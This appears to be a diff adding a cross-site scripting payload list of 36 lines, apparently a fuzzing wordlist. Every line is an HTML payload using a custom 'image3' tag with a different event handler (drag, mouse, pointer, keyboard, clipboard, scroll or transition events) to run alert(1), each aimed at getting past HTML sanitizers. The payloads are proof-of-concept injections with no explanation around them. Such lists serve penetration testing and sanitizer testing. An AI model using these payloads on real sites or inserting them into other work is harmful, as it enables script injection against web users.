@@ -1,0 +1,36 @@
+<image3 contenteditable onbeforeinput=alert(1)>test
+<image3 draggable="true" ondrag="alert(1)" style=display:block>test</image3>
+<image3 draggable="true" ondragend="alert(1)" style=display:block>test</image3>
+<image3 draggable="true" ondragenter="alert(1)" style=display:block>test</image3>
+<image3 draggable="true" ondragleave="alert(1)" style=display:block>test</image3>
+<image3 draggable="true" ondragstart="alert(1)" style=display:block>test</image3>
+<image3 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></image3>
+<image3 onafterscriptexecute=alert(1)><script>1</script>
+<image3 onbeforescriptexecute=alert(1)><script>1</script>
+<image3 onblur=alert(1) id=x tabindex=1 style=display:block>test</image3><input value=clickme>
+<image3 onclick="alert(1)" style=display:block>test</image3>
+<image3 oncontextmenu="alert(1)" style=display:block>test</image3>
+<image3 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<image3 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<image3 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</image3>
+<image3 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</image3><input value=clickme>
+<image3 onkeydown="alert(1)" contenteditable style=display:block>test</image3>
+<image3 onkeypress="alert(1)" contenteditable style=display:block>test</image3>
+<image3 onkeyup="alert(1)" contenteditable style=display:block>test</image3>
+<image3 onmousedown="alert(1)" style=display:block>test</image3>
+<image3 onmouseenter="alert(1)" style=display:block>test</image3>
+<image3 onmouseleave="alert(1)" style=display:block>test</image3>
+<image3 onmousemove="alert(1)" style=display:block>test</image3>
+<image3 onmouseout="alert(1)" style=display:block>test</image3>
+<image3 onmouseover="alert(1)" style=display:block>test</image3>
+<image3 onmouseup="alert(1)" style=display:block>test</image3>
+<image3 onmousewheel=alert(1) style=display:block>requires scrolling
+<image3 onpointerdown=alert(1) style=display:block>XSS</image3>
+<image3 onpointerenter=alert(1) style=display:block>XSS</image3>
+<image3 onpointerleave=alert(1) style=display:block>XSS</image3>
+<image3 onpointermove=alert(1) style=display:block>XSS</image3>
+<image3 onpointerout=alert(1) style=display:block>XSS</image3>
+<image3 onpointerover=alert(1) style=display:block>XSS</image3>
+<image3 onpointerrawupdate=alert(1) style=display:block>XSS</image3>
+<image3 onpointerup=alert(1) style=display:block>XSS</image3>
+<image3 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></image3>
